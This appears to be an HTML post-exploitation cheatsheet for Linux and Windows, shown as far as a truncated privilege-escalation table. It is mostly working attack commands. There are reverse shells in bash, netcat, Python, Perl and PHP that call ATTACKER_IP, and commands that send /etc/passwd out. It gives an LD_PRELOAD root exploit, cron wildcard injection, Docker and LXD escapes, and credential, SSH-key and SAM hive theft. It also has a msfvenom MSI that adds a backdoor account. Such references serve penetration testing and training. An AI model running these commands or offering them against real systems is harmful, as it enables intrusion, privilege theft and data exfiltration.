<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Post-Exploitation Cheatsheet</title>
    <link href="https://fonts.cdnfonts.com/css/dubai" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0a0a;
            --fg: #e0e0e0;
            --accent: #b30000;
            --accent-glow: #ff3333;
            --panel: #111;
            --border: #222;
            --font: "Dubai", "Segoe UI", sans-serif;
            --size: 1rem;
            --linux-color: #ff3333;
            --windows-color: #1e90ff;
            --search-highlight: #ff3333;
            --note-bg: #1a2a1a;
            --tip-bg: #1a2a2a;
            --warning-bg: #2a1a1a;
        }
        
        * {
            box-sizing: border-box;
            font-family: var(--font);
            margin: 0;
            padding: 0;
        }
        
        body {
            background: var(--bg);
            color: var(--fg);
            font-size: 0.95rem;
            line-height: 1.6;
            padding: 25px;
            font-weight: 400;
            letter-spacing: 0.2px;
        }
        
        h1 {
            color: #f0f0f0;
            margin: 0 0 30px 0;
            font-weight: 700;
            border-bottom: 2px solid #cc0000;;
            padding-bottom: 8px;
            text-align: center;
            font-size: 2.2rem;
        }
        
        .container {
            display: flex;
            gap: 25px;
            margin-top: 20px;
        }
        
        .column {
            flex: 1;
            background: var(--panel);
            padding: 25px;
            border-radius: 8px;
            border-left: 4px solid;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            max-height: calc(100vh - 200px);
            overflow-y: auto;
        }
        
        .column::-webkit-scrollbar {
            width: 10px;
        }
        
        .column::-webkit-scrollbar-track {
            background: #111;
            border-radius: 5px;
        }
        
        .column::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 5px;
        }
        
        .column::-webkit-scrollbar-thumb:hover {
            background: var(--accent-glow);
        }
        
        .linux-column {
            border-left-color: var(--linux-color);
        }
        
        .windows-column {
            border-left-color: var(--windows-color);
        }
        
        .column h2 {
            color: #f0f0f0;
            margin: 0 0 20px 0;
            font-weight: 700;
            padding-bottom: 8px;
            border-bottom: 1px solid var(--border);
            font-size: 1.6rem;
            text-align: center;
        }
        
        .linux-column h2 {
            color: var(--linux-color);
        }
        
        .windows-column h2 {
            color: var(--windows-color);
        }
        
        .cmd-header {
            background: #151515;
            color: var(--fg);
            padding: 15px 20px;
            border-radius: 6px;
            margin-bottom: 15px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.3s ease;
            border: 1px solid var(--border);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            scroll-margin-top: 10px;
        }
        
        .cmd-header:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            border-color: var(--accent);
        }
        
        .linux-column .cmd-header {
            border-left: 3px solid var(--linux-color);
        }
        
        .windows-column .cmd-header {
            border-left: 3px solid var(--windows-color);
        }
        
        .cmd-header h3 {
            margin: 0;
            color: var(--fg);
            font-size: 1.1rem;
            font-weight: 600;
        }
        
        .cmd-header .toggle-icon {
            font-size: 1rem;
            transition: transform 0.3s ease;
            color: var(--accent-glow);
        }
        
        .cmd-header.expanded .toggle-icon {
            transform: rotate(180deg);
        }
        
        .sec-body {
            display: none;
            overflow: hidden;
            margin-bottom: 25px;
        }
        
        .sec-body.active {
            display: block;
        }
        
        pre {
            background: #000;
            padding: 18px;
            border-left: 4px solid var(--accent);
            white-space: pre-wrap;
            margin: 15px 0;
            border-radius: 0 8px 8px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.5;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        
        code {
            background: #151515;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            color: #ff9966;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
            line-height: 1.6;
        }
        
        .note {
            background: var(--note-bg);
            padding: 12px;
            border-left: 4px solid #44ff44;
            margin: 15px 0;
            font-size: 0.9rem;
            border-radius: 0 6px 6px 0;
        }
        
        .warning {
            background: var(--warning-bg);
            padding: 12px;
            border-left: 4px solid #ff4444;
            margin: 15px 0;
            font-size: 0.9rem;
            border-radius: 0 6px 6px 0;
        }
        
        .tip {
            background: var(--tip-bg);
            padding: 12px;
            border-left: 4px solid #3399ff;
            margin: 15px 0;
            font-size: 0.9rem;
            border-radius: 0 6px 6px 0;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
            font-size: 0.9rem;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        
        th {
            background: #222;
            padding: 12px;
            text-align: left;
            border: 1px solid var(--border);
            font-weight: 600;
            color: #f0f0f0;
        }
        
        td {
            padding: 12px;
            border: 1px solid var(--border);
            vertical-align: top;
        }
        
        .search-container {
            margin-bottom: 25px;
            text-align: center;
        }
        
        #searchBox {
            width: 100%;
            max-width: 600px;
            padding: 12px 18px;
            background: #151515;
            color: var(--fg);
            border: 1px solid var(--border);
            font-size: 0.95rem;
            margin-bottom: 15px;
            border-radius: 6px;
            transition: all 0.3s ease;
            font-family: var(--font);
        }
        
        #searchBox:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(255, 51, 51, 0.2);
        }
        
        .quick-links {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 20px 0;
            justify-content: center;
        }
        
        .quick-link {
            background: #151515;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 0.9rem;
            cursor: pointer;
            border: 1px solid var(--border);
            transition: all 0.3s ease;
            color: var(--fg);
            text-decoration: none;
            font-weight: 500;
        }
        
        .quick-link:hover {
            background: #222;
            border-color: var(--accent);
            transform: translateY(-2px);
        }
        
        .highlight {
            background-color: var(--search-highlight);
            color: #fff;
            font-weight: bold;
            padding: 0 4px;
            border-radius: 2px;
        }
        
        .search-result {
            animation: searchPulse 2s ease-in-out;
        }
        
        @keyframes searchPulse {
            0% { background: #2a1a1a; }
            50% { background: #3a1a1a; }
            100% { background: #2a1a1a; }
        }
        
        .section-explanation {
            font-style: italic;
            color: #aaa;
            margin-bottom: 15px;
            padding-left: 10px;
            border-left: 2px solid #444;
        }
        
        .methodology {
            background: #1a1a2a;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            border: 1px solid #444;
        }
        
        .methodology h4 {
            color: #3399ff;
            margin-bottom: 10px;
        }
        
        
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
            }
            
            .column {
                max-height: none;
            }
            
            .quick-links {
                flex-direction: column;
                align-items: center;
            }
            
            .quick-link {
                width: 100%;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <h1>Post-Exploitation Cheatsheet</h1>
    
    <div class="search-container">
        <input type="text" id="searchBox" placeholder="Search for commands, techniques, tools... (min 2 chars)">
    </div>
    
    <div class="quick-links">
        <a class="quick-link" onclick="scrollToSection('linux-shell')">Shell Upgrade</a>
        <a class="quick-link" onclick="scrollToSection('linux-enum')">Linux Enum</a>
        <a class="quick-link" onclick="scrollToSection('linux-privesc')">Linux PrivEsc</a>
        <a class="quick-link" onclick="scrollToSection('linux-filetransfer')">Linux File Transfer</a>
        <a class="quick-link" onclick="scrollToSection('windows-enum')">Windows Enum</a>
        <a class="quick-link" onclick="scrollToSection('windows-privesc')">Windows PrivEsc</a>
        <a class="quick-link" onclick="scrollToSection('windows-filetransfer')">Windows File Transfer</a>
        <a class="quick-link" onclick="scrollToSection('ad-enum')">AD Enumeration</a>
        <a class="quick-link" onclick="clearSearch(true)">Clear Search</a>
        <a class="quick-link" onclick="toggleAll()">Toggle All Sections</a>
    </div>
    
    <div class="container">
        <!-- LEFT COLUMN - LINUX -->
        <div class="column linux-column">
            <h2>LINUX POST-EXPLOITATION</h2>
            
            <div id="linux-shell" class="cmd-header" onclick="toggleSection(this)">
                <h3>SHELL STABILIZATION & UPGRADE</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">First actions after getting low-priv shell - stabilize and upgrade to interactive TTY</div>
                
                <div class="note">Basic shell stabilization:</div>
                <pre># Check current shell and upgrade to bash
echo $SHELL
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Alternative methods
script -qc /bin/bash
perl -e 'exec "/bin/bash";'</pre>
                
                <div class="note">Full TTY upgrade with proper terminal:</div>
                <pre># Set proper environment for stability
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
export SHELL=/bin/bash
alias ll='ls -lsaht --color=auto'

# Background current shell with Ctrl+Z, then:
stty raw -echo; fg; reset

# Set terminal size
stty rows 50 columns 200
stty size</pre>
                
                <div class="tip">Check for available tools/compilers:</div>
                <pre># Check what's available for exploitation
which gcc cc python python3 perl php ruby node npm
which wget curl nc ncat socat netcat ftp ssh
which tar zip unzip gzip
which vi vim nano ed

# Check kernel version for exploits
uname -a
cat /proc/version</pre>
            </section>
            
            <div id="linux-enum" class="cmd-header" onclick="toggleSection(this)">
                <h3>SYSTEM ENUMERATION</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Gather system information to identify privilege escalation vectors</div>
                
                <pre># Basic system info
id
whoami
hostname
uname -a
cat /etc/*-release
cat /etc/issue
lsb_release -a 2>/dev/null
cat /proc/version

# User information
cat /etc/passwd
cat /etc/group
who
w
last
lastlog
last -f /var/log/wtmp 2>/dev/null

# Check sudo privileges
sudo -l
sudo -v  # Check if sudo works without password
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null</pre>
                
                <div class="note">Process and service enumeration:</div>
                <pre># Processes
ps aux
ps -ef
ps aux | grep root
ps aux | grep -v "^\["
pstree -p
top -n 1 -b

# Services
systemctl list-units --type=service --state=running
service --status-all 2>/dev/null
chkconfig --list 2>/dev/null

# Cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
ls -la /var/spool/cron/
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly</pre>
                
                <div class="note">Network and connections:</div>
                <pre># Network configuration
ifconfig
ip a
ip addr show
ip route
route -n
netstat -r

# Active connections
netstat -tulpn
netstat -ano
ss -tulpn
lsof -i

# ARP cache
arp -a
ip neigh show

# DNS
cat /etc/resolv.conf
cat /etc/hosts</pre>
                
                <div class="note">File system and installed software:</div>
                <pre># Disk usage
df -h
lsblk
fdisk -l 2>/dev/null

# Mounted filesystems
mount
cat /etc/fstab
cat /proc/mounts

# Installed packages
dpkg -l 2>/dev/null  # Debian/Ubuntu
rpm -qa 2>/dev/null  # RHEL/CentOS
pacman -Q 2>/dev/null  # Arch
apk info 2>/dev/null  # Alpine</pre>
            </section>
            
            <div id="linux-privesc" class="cmd-header" onclick="toggleSection(this)">
                <h3>PRIVILEGE ESCALATION</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Systematic privilege escalation techniques for Linux systems</div>
                
                <div class="note">SUID/SGID binaries:</div>
                <pre># Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -user root -type f -perm -04000 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -type f -perm -02000 -ls 2>/dev/null

# Check GTFOBins for exploitation: https://gtfobins.github.io/

# Common exploitable SUID binaries
# find, nano, vim, vi, bash, less, more, awk, man, cp, mv, cat</pre>
                
                <div class="note">Capabilities exploitation:</div>
                <pre>getcap -r / 2>/dev/null

# Exploit examples
# If python has cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# If tar has CAP_DAC_READ_SEARCH
/usr/bin/tar -cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh</pre>
                
                <div class="note">Sudo exploitation:</div>
                <pre># Check sudo permissions
sudo -l

# LD_PRELOAD exploitation (if env_keep includes LD_PRELOAD)
cat > /tmp/exploit.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so <COMMAND>

# NOPASSWD exploitation
# If you can run any command without password:
sudo su
sudo bash
sudo sh</pre>
                
                <div class="note">File and directory permissions:</div>
                <pre># World-writable files
find / -perm -o+w -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"

# World-writable directories
find / -perm -o+w -type d 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"

# Files owned by current user
find / -user $(whoami) -type f 2>/dev/null | head -20

# Check /etc/passwd and /etc/shadow permissions
ls -la /etc/passwd /etc/shadow /etc/group /etc/sudoers

# Writable crontab files
find /etc/cron* -type f -writable 2>/dev/null
find /var/spool/cron -type f -writable 2>/dev/null</pre>
                
                <div class="note">Cron job exploitation:</div>
                <pre># Wildcard injection in tar cron jobs
cd /path/to/writable/directory
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"

# PATH hijacking in cron jobs
export PATH=/tmp:$PATH
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/program_name
chmod +x /tmp/program_name

# Overwrite existing cron script
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
# Original script below if needed' > /path/to/cron/script</pre>
                
                <div class="note">Kernel exploits (Last resort):</div>
                <pre># Check kernel version
uname -a
cat /proc/version

# Common kernel exploits
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 through 4.8.3
# PwnKit (CVE-2021-4034) - Polkit pkexec
# OverlayFS (CVE-2021-3493) - Ubuntu

# Check for available compilers
which gcc
which cc
which make

# Check architecture
arch
uname -m
file /bin/bash</pre>
                
                <div class="note">Container escape:</div>
                <pre># Check if in container
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv
grep -qi docker /proc/self/cgroup

# Docker escape if in docker group
docker run -v /:/mnt -it alpine chroot /mnt sh
docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# LXD/LXC escape (if in lxd group)
lxc init ubuntu test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash</pre>
                
                <div class="note">Password and hash extraction:</div>
                <pre># Check for readable shadow file
cat /etc/shadow 2>/dev/null

# Extract hashes for cracking
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt 2>/dev/null

# Find password files
find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null  # KeePass
find / -name "*.ovpn" 2>/dev/null  # OpenVPN configs
find / -name "*pass*" -o -name "*cred*" -o -name "*pwd*" 2>/dev/null</pre>
            </section>
            
            <div id="linux-filetransfer" class="cmd-header" onclick="toggleSection(this)">
                <h3>FILE TRANSFER & DOWNLOADS</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Transfer files to/from the compromised system for tools and exploitation</div>
                
                <div class="note">Download files from attacker:</div>
                <pre># Using wget
wget http://ATTACKER_IP:8000/file -O /tmp/file
wget -q http://ATTACKER_IP:8000/file -O /tmp/file

# Using curl
curl http://ATTACKER_IP:8000/file -o /tmp/file
curl -s http://ATTACKER_IP:8000/file -o /tmp/file

# Using netcat (receiver)
nc -lvp 4444 > /tmp/file  # Attacker: nc -w 3 ATTACKER_IP 4444 < file

# Using scp (if SSH is available)
scp user@ATTACKER_IP:/path/to/file /tmp/file</pre>
                
                <div class="note">Upload files to attacker:</div>
                <pre># Using netcat (sender)
nc -w 3 ATTACKER_IP 4444 < /etc/passwd  # Attacker: nc -lvp 4444 > received

# Using wget POST
# Attacker: python3 -m uploadserver
wget --post-file=/etc/passwd http://ATTACKER_IP:8000/upload

# Using curl
curl -X POST -F 'file=@/etc/passwd' http://ATTACKER_IP:8000/upload</pre>
                
                <div class="note">Python HTTP server (from attacker):</div>
                <pre># Python 3
python3 -m http.server 8000
python3 -m http.server 8000 --directory /path/to/share

# Python 2
python -m SimpleHTTPServer 8000

# With upload capability
python3 -m uploadserver 8000</pre>
                
                <div class="note">Base64 encoding/decoding for small files:</div>
                <pre># Encode file to base64
base64 /etc/passwd
cat /etc/passwd | base64

# Decode base64 on target
echo "base64_string_here" | base64 -d > /tmp/file</pre>
                
                <div class="note">Create files directly on target:</div>
                <pre># Create binary from hexdump
echo "hex_string_here" | xxd -r -p > /tmp/binary

# Create script directly
cat > /tmp/script.sh << 'EOF'
#!/bin/bash
echo "Hello from script"
EOF
chmod +x /tmp/script.sh</pre>
            </section>
            
            <div class="cmd-header" onclick="toggleSection(this)">
                <h3>CREDENTIAL HUNTING</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Search for passwords, keys, and sensitive information on the system</div>
                
                <pre># Search for files containing passwords
find / -type f -exec grep -l -i "password\|pass\|pwd" {} \; 2>/dev/null | head -20
find /home -type f -exec grep -l -i "password" {} \; 2>/dev/null
find /var/www -type f -exec grep -l -i "password" {} \; 2>/dev/null

# Search in config files
find /etc -type f -name "*.conf" -exec grep -l -i "password\|pass\|pwd" {} \; 2>/dev/null
find / -type f \( -name "*.php" -o -name "*.py" -o -name "*.js" \) -exec grep -l -i "password" {} \; 2>/dev/null | head -10

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
find /home -name "*.ssh" -type d 2>/dev/null | xargs -I {} find {} -name "id_*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Database files and configs
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null
find / -type f -name "wp-config.php" -o -name "config.inc.php" -o -name "configuration.php" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null
cat ~/.psql_history 2>/dev/null

# Backup files
find / -name "*backup*" -o -name "*.bak" -o -name "*.old" -o -name "*.orig" 2>/dev/null</pre>
                
                <div class="note">Check for sensitive environment variables:</div>
                <pre>env | grep -i "pass\|pwd\|key\|secret\|token"
printenv | grep -i "pass\|pwd\|key\|secret\|token"

# Check for credentials in memory
strings /dev/mem | grep -i "password" 2>/dev/null</pre>
                
                <div class="note">Browser credentials (if GUI access):</div>
                <pre># Firefox
find /home -name "logins.json" -o -name "key4.db" -o -name "cert9.db" 2>/dev/null

# Chrome/Chromium
find /home -name "Login Data" -o -name "Cookies" -o -name "History" 2>/dev/null

# Decrypt Firefox passwords (if master password not set)
python3 -c "import json, base64, os, sys; \
from Crypto.Cipher import DES3; \
import sqlite3; \
print('Firefox credential extraction')"</pre>
            </section>
            
            <div class="cmd-header" onclick="toggleSection(this)">
                <h3>REVERSE SHELLS & PIVOTING</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Establish better shells and pivot to internal networks</div>
                
                <div class="note">Reverse shells from Linux:</div>
                <pre># Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Netcat traditional
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
                
                <div class="note">Port forwarding and pivoting:</div>
                <pre># SSH port forwarding (if SSH access)
ssh -L 8080:localhost:80 user@TARGET  # Local forward
ssh -R 8080:localhost:80 user@ATTACKER  # Remote forward
ssh -D 1080 user@TARGET  # SOCKS proxy

# Using chisel (need to upload binary)
# On attacker: ./chisel server -p 8080 --reverse
# On target: ./chisel client ATTACKER_IP:8080 R:socks

# Using socat
socat TCP-LISTEN:4444,fork TCP:INTERNAL_IP:3389  # Port forward
socat TCP-LISTEN:4444,fork EXEC:/bin/bash  # Bind shell</pre>
                
                <div class="note">Internal network scanning from target:</div>
                <pre># Ping sweep
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" & done

# Quick port scan with netcat
for port in {1..1000}; do timeout 1 bash -c "echo >/dev/tcp/192.168.1.1/$port" 2>/dev/null && echo "Port $port is open"; done

# Using nmap if available
nmap -sn 192.168.1.0/24
nmap -p 22,80,443,3389,5985 192.168.1.0/24</pre>
            </section>
            
            <div class="cmd-header" onclick="toggleSection(this)">
                <h3>AUTOMATED TOOLS & SCRIPTS</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Useful post-exploitation scripts and tools</div>
                
                <ul>
                    <li><strong>LinPEAS</strong>: <code>https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</code>
                        <pre>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a  # All checks
./linpeas.sh -s  # Superfast mode</pre>
                    </li>
                    
                    <li><strong>LinEnum</strong>: <code>https://github.com/rebootuser/LinEnum</code>
                        <pre>./LinEnum.sh -t -k keyword -r report -e /tmp/ -s</pre>
                    </li>
                    
                    <li><strong>Linux Exploit Suggester</strong>: <code>https://github.com/mzet-/linux-exploit-suggester</code>
                        <pre>./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl</pre>
                    </li>
                    
                    <li><strong>pspy</strong>: Monitor processes without root - <code>https://github.com/DominicBreuker/pspy</code>
                        <pre>./pspy64
./pspy64 -pf -i 1000</pre>
                    </li>
                    
                    <li><strong>LSE (Linux Smart Enumeration)</strong>: <code>https://github.com/diego-treitos/linux-smart-enumeration</code>
                        <pre>./lse.sh -l1  # Level 1 (fast)
./lse.sh -l2  # Level 2 (complete)</pre>
                    </li>
                    
                    <li><strong>GTFOBins</strong>: SUID/Sudo exploitation reference - <code>https://gtfobins.github.io/</code></li>
                    
                    <li><strong>Traitor</strong>: Auto find and exploit - <code>https://github.com/liamg/traitor</code>
                        <pre>./traitor -a</pre>
                    </li>
                    
                    <li><strong>unix-privesc-check</strong>: <code>https://github.com/pentestmonkey/unix-privesc-check</code>
                        <pre>./unix-privesc-check standard
./unix-privesc-check detailed</pre>
                    </li>
                </ul>
            </section>
        </div>
        
        <!-- RIGHT COLUMN - WINDOWS -->
        <div class="column windows-column">
            <h2>WINDOWS POST-EXPLOITATION</h2>
            
            <div id="windows-enum" class="cmd-header" onclick="toggleSection(this)">
                <h3>SYSTEM ENUMERATION</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Gather Windows system information and identify privilege escalation vectors</div>
                
                <pre># Basic system information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
whoami
whoami /all
whoami /priv
whoami /groups

# User and group information
net user
net user %USERNAME%
net user /domain  # If domain joined
net localgroup
net localgroup administrators
net group "Domain Admins" /domain  # Domain only
net group "Domain Users" /domain   # Domain only

# Network information
ipconfig /all
ipconfig /displaydns
route print
arp -a
netstat -ano
netstat -an | findstr LISTENING
netsh firewall show state
netsh advfirewall firewall show rule name=all</pre>
                
                <div class="note">Process and service enumeration:</div>
                <pre># Processes
tasklist /svc
tasklist /V
tasklist /FI "USERNAME eq SYSTEM"
wmic process get name,processid,parentprocessid,commandline

# Services
sc query
sc query state= all
sc qc [service_name]
wmic service get name,displayname,pathname,startmode
Get-WmiObject -Class Win32_Service | Select-Object Name,DisplayName,PathName,StartMode

# Scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /tn [task_name] /fo list /v
Get-ScheduledTask | Select TaskName,State</pre>
                
                <div class="note">File system and registry checks:</div>
                <pre># Drive information
wmic logicaldisk get caption,description,providername
fsutil fsinfo drives

# Installed software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
dir "C:\Program Files", "C:\Program Files (x86)" /b

# Check architecture
echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture</pre>
                
                <div class="note">PowerShell enumeration:</div>
                <pre>Get-Process | Select-Object ProcessName,Id,SessionId,Path
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-NetIPAddress | Select-Object IPAddress,InterfaceAlias
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
Get-ChildItem -Path C:\ -Include *.txt,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select-Object -First 10
Get-WmiObject -Class Win32_UserAccount | Select-Object Name,Disabled,Lockout,SID</pre>
            </section>
            
            <div id="windows-privesc" class="cmd-header" onclick="toggleSection(this)">
                <h3>PRIVILEGE ESCALATION</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Windows privilege escalation techniques and misconfigurations</div>
                
                <div class="note">Check user privileges:</div>
                <pre>whoami /priv
# Look for:
# SeImpersonatePrivilege      -> PrintSpoofer, JuicyPotato
# SeAssignPrimaryTokenPrivilege -> RottenPotato
# SeDebugPrivilege            -> Mimikatz, Procdump
# SeBackupPrivilege           -> Diskshadow
# SeRestorePrivilege          -> Replace utilman.exe
# SeLoadDriverPrivilege       -> Capcom.sys
# SeTakeOwnershipPrivilege    -> File ownership
# SeTcbPrivilege              -> Act as part of OS
# SeCreateTokenPrivilege      -> Create tokens</pre>
                
                <div class="note">Unquoted service paths:</div>
                <pre>wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /v /i "C:\Windows\\" | findstr /i /v "\""

# PowerShell version
Get-WmiObject -Class Win32_Service | Select-Object Name,DisplayName,PathName,StartMode | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'}</pre>
                
                <div class="note">Weak service permissions:</div>
                <pre># Using accesschk.exe (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv %USERNAME% *
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv Users *

# Using sc.exe
sc qc [service_name]
sc sdshow [service_name]

# Check for writable service binaries
for /f "tokens=2 delims='='" %i in ('wmic service get name /value') do @for /f "delims='='" %j in ('wmic service where "name='%i'" get pathname /value') do @echo %i & @echo %j & @icacls "%j" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /v ":\\"</pre>
                
                <div class="note">AlwaysInstallElevated registry check:</div>
                <pre>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, create malicious MSI:
# On attacker: msfvenom -p windows/adduser USER=backdoor PASS=Backdoor123! -f msi -o setup.msi
# On target: msiexec /quiet /qn /i setup.msi</pre>
                
                <div class="note">DLL Hijacking and PATH issues:</div>
                <pre># Check PATH environment variable
echo %PATH%
path

# Look for writable directories in PATH
for %i in (%PATH:;=";"%) do @echo %i && icacls "%i" 2>nul | findstr "(W) (M) (F)"

# Common DLL hijacking targets
# wlbsctrl.dll (IIS)
# CRYPTBASE.dll
# PROPSYS.dll</pre>
                
                <div class="note">SAM/SYSTEM hive extraction:</div>
                <pre># Manual extraction
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Using PowerShell
Copy-Item C:\Windows\System32\config\SAM C:\Users\Public\sam.save
Copy-Item C:\Windows\System32\config\SYSTEM C:\Users\Public\system.save

# Using Volume Shadow Copy (if SeBackupPrivilege)
diskshadow /s script.txt
# In script.txt: set context persistent nowriters, create shadow, expose shadow c:</pre>
                
                <div class="note">Privilege exploitation tools table:</div>
                <table>
                    <tr><th>Privilege</th><th>Tool/Exploit</th><th>GitHub</th></tr>
                    <tr><td>SeImpersonatePrivilege</td><td>PrintSpoofer</td><td>github.com/itm4n/PrintSpoofer</td></tr>
                    <tr><td>SeImpersonatePrivilege</td><td>JuicyPotato</td><td>github.com/ohpe/juicy-potato</td></tr>
                    <tr><td>SeAssignPrimaryToken</td><td>RottenPotatoNG</td><td>github.com/breenmachine/RottenPotatoNG</td></tr>
                    <tr><td>SeDebugPrivilege</td><td>Mimikatz</td><td>github.com/gentilkiwi/mimikatz</td></tr>
                    <tr><td>SeLoadDriverPrivilege</td><td>Capcom.sys exploit</td><td>github.com/tandasat/ExploitCapcom</td></tr>
                    <tr><td>SeBackupPrivilege</td><td>Diskshadow</td><td>Built-in</td></tr>
                    <tr><td>SeRestorePrivilege</td><td>Utilman.exe replace</td><td>Manual technique</td></tr>
